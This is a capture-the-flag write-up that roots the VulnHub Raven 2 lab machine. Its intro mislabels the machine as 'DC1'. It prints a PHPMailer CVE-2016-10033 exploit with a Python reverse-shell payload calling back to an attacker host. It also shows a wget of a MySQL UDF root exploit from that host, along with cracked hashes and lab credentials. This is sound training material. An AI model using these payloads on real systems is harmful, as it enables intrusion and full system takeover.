### Raven 2 VulnHub Challenge Writeup

This writeup covers the complete exploitation of the DC1 machine from VulnHub, demonstrating a full penetration testing methodology from reconnaissance to privilege escalation.

## Network Discovery

First, I performed network discovery to identify the target machine:

```shellscript
# ARP scan results showing discovered hosts
Currently scanning: Finished!   |   Screen View: Unique Hosts

6 Captured ARP Req/Rep packets, from 6 hosts.   Total size: 342
_____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
-----------------------------------------------------------------------------
 192.168.1.1     cc:b0:71:a8:71:e8      1      42  Fiberhome Telecommunication Technologies Co.,LTD
 192.168.1.13    08:00:27:c9:90:31      1      60  PCS Systemtechnik GmbH                          
 192.168.1.2     a4:f0:5e:9a:8f:ad      1      60  GUANGDONG OPPO MOBILE TELECOMMUNICATIONS CORP.,LTD
 192.168.1.3     16:18:69:af:bc:87      1      60  Unknown vendor                                  
 192.168.1.7     28:7e:80:f8:41:c2      1      60  Hui Zhou Gaoshengda Technology Co.,LTD          
 192.168.1.4     86:d3:bc:f2:53:0f      1      60  Unknown vendor
```

The target machine is identified as **192.168.1.13** (raven.local).

## Port Scanning

```shellscript
nmap -sS -sV -Pn --min-rate=1000 --max-retries=2 192.168.1.13
```

**Results:**

```plaintext
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
80/tcp  open  http    Apache httpd 2.4.10 ((Debian))
111/tcp open  rpcbind 2-4 (RPC #100000)
MAC Address: 08:00:27:C9:90:31 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Web Application Enumeration

```shellscript
gobuster dir -u http://192.168.1.13/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

**Discovered directories:**

```plaintext
/img                  (Status: 301) [Size: 310] [--> http://192.168.1.13/img/]
/css                  (Status: 301) [Size: 310] [--> http://192.168.1.13/css/]
/wordpress            (Status: 301) [Size: 316] [--> http://192.168.1.13/wordpress/]
/js                   (Status: 301) [Size: 309] [--> http://192.168.1.13/js/]
/vendor               (Status: 301) [Size: 313] [--> http://192.168.1.13/vendor/]
/manual               (Status: 301) [Size: 313] [--> http://192.168.1.13/manual/]
/fonts                (Status: 312) [Size: 312] [--> http://192.168.1.13/fonts/]
/server-status        (Status: 403) [Size: 300]
```

## Flag Discovery

### Flag 1 - Direct Access via /vendor Directory

Exploring the `/vendor` directory revealed various files including PHPMailer components:


<img width="850" height="676" alt="image" src="https://github.com/user-attachments/assets/3f0c643e-dd55-4fad-becc-4a490c3b4665" />



The `PATH` file contained the first flag:


<img width="530" height="117" alt="image" src="https://github.com/user-attachments/assets/df103605-699d-4e8d-bd38-599e97b288ec" />



**Flag 1**: `flag1{a2c1f66d2b8051bd3a5874b5b6e43e21}`

### PHPMailer Vulnerability Discovery

The vendor directory contained PHPMailer with known security vulnerabilities. The `SECURITY.md` file revealed multiple CVEs:


<img width="1322" height="567" alt="image" src="https://github.com/user-attachments/assets/7644bdf4-41d9-4537-8614-8443b0304a6a" />



Key vulnerabilities identified:

- **CVE-2016-10033**: Remote code execution vulnerability
- **CVE-2015-8476**: SMTP CRLF injection
- **CVE-2008-5619**: Remote code execution in bundled html2text library


## Initial Exploitation

### PHPMailer CVE-2016-10033 Exploit

Used the PHPMailer exploit to gain initial access through the contact form:

```python
# PHPMailer Exploit CVE 2016-10033 - anarcoder at protonmail.com
target = 'http://192.168.1.13/contact.php'
backdoor = '/mchi.php'
payload = '<?php system(\'python -c """import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\'192.168.1.6\\\',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"])"""\'); ?>'

fields={'action': 'submit',
        'name': payload,
        'email': '"anarcoder\\" -OQueueDirectory=/tmp -X/var/www/html/mchi.php server\\" @protonmail.com',
        'message': 'Pwned'}
```

**Reverse Shell Established:**

```shellscript
nc -lnvp 4444
# Connection received on 192.168.1.13 38415
# Shell as www-data user
```


<img width="1195" height="224" alt="image" src="https://github.com/user-attachments/assets/d34a14ca-530f-4bbe-bbb5-0ba473dc5e95" />



## Post-Exploitation Enumeration

### Upgrading Shell

```shellscript
python -c "import pty;pty.spawn('/bin/bash')"
```

### Flag 2 Discovery

```shellscript
www-data@Raven:/var/www$ cat flag2.txt
flag2{6a8ed560f0b5358ecf844108048eb337}
```

### WordPress Database Access

Found database credentials in `wp-config.php`:

```php
define('DB_NAME', 'wordpress');
define('DB_USER', 'root');
define('DB_PASSWORD', 'R@v3nSecurity');
define('DB_HOST', 'localhost');
```

### Database Enumeration

```shellscript
mysql -u root -pR@v3nSecurity
```

```sql
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| wordpress          |
+--------------------+

mysql> use wordpress;
mysql> select * from wp_users;
+----+------------+------------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+----------------+
| ID | user_login | user_pass                          | user_nicename | user_email        | user_url | user_registered     | user_activation_key | user_status | display_name   |
+----+------------+------------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+----------------+
|  1 | michael    | $P$BjRvZQ.VQcGZlDeiKToCQd.cPw5XCe0 | michael       | michael@raven.org |          | 2018-08-12 22:49:12 |                     |           0 | michael        |
|  2 | steven     | $P$B6X3H3ykawf2oHuPsbjQiih5iJXqad. | steven        | steven@raven.org  |          | 2018-08-12 23:31:16 |                     |           0 | Steven Seagull |
+----+------------+------------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+----------------+
```

### Flag 3 Discovery

Found flag3 as an uploaded image in WordPress:

```sql
mysql> select * from wp_posts;
# Found flag3 as attachment: http://raven.local/wordpress/wp-content/uploads/2018/11/flag3.png
```


<img width="1335" height="498" alt="image" src="https://github.com/user-attachments/assets/48f59917-8b77-432b-a1cb-e0091af61c43" />



**Flag 3**: `flag3{a0f568aa9de277887f37730d9b}`

### Password Cracking

```shellscript
# Cracking steven's password hash
echo '$P$B6X3H3ykawf2oHuPsbjQiih5iJXqad.' > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Result: LOLLOL1
```

## Privilege Escalation

### SUID Binary Analysis

```shellscript
find / -perm -4000 2> /dev/null
```

Key findings:

- `/usr/bin/procmail` (SUID root)
- `/sbin/mount.nfs` (SUID root)


### Method  MySQL UDF Privilege Escalation

Downloaded and executed MySQL UDF exploit:

```shellscript
wget http://192.168.1.6/udf_root.py
python udf_root.py -u root -pR@v3nSecurity
```

**Exploit Process:**

```plaintext
Plugin dir is /usr/lib/mysql/plugin/
Trying to create a udf library...
UDF library created successfully: /usr/lib/mysql/plugin/udf4650.so
Trying to create sys_exec...
Checking if sys_exec was created...
sys_exec was found: name: sys_exec ret: 2 dl: udf4650.so type: function
Generating a suid binary in /tmp/sh...
Trying to spawn a root shell...
```

## Root Access Achieved

```shellscript
# id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)

# cd /root
# cat flag4.txt
```

**Final Flag:**

```plaintext
  ___                   ___ ___  
 | _ \__ ___ _____ _ _ |_ _|_ _| 
 |   / _` \ V / -_) ' \ | | | |  
 |_|_\__,_|\_/\___|_||_|___|___|

flag4{df2bc5e951d91581467bb9a2a8ff4425}

CONGRATULATIONS on successfully rooting Raven
I hope you enjoyed this second iteration of the Raven VM
Hit me up on Twitter and let me know what you thought: @mccannwj / wjmccann.github.io
```

## Summary

**Flags Collected:**

1. `flag1{a2c1f66d2b8051bd3a5874b5b6e43e21}` - Found in `/vendor/PATH`
2. `flag2{6a8ed560f0b5358ecf844108048eb337}` - Found in `/var/www/flag2.txt`
3. `flag3{a0f568aa9de277887f37730d9b}` - WordPress uploaded image
4. `flag4{df2bc5e951d91581467bb9a2a8ff4425}` - Root flag


**Attack Vector Summary:**

1. **Reconnaissance**: Network discovery and port scanning identified target
2. **Web Enumeration**: Directory brute-forcing revealed WordPress and vendor directories
3. **Information Gathering**: Direct access to flag1 via vendor/PATH file
4. **Vulnerability Discovery**: PHPMailer CVE-2016-10033 in vendor directory
5. **Initial Access**: Reverse shell via PHPMailer exploit through contact form
6. **Lateral Movement**: Database credential extraction from wp-config.php
7. **Flag Collection**: Found flags in database and file system
8. **Privilege Escalation**: MySQL UDF exploitation for root access
9. **Root Access**: Full system compromise and final flag collection


This challenge demonstrated a realistic attack scenario involving web application vulnerabilities, insecure file permissions, database misconfigurations, and privilege escalation techniques commonly found in penetration testing engagements.
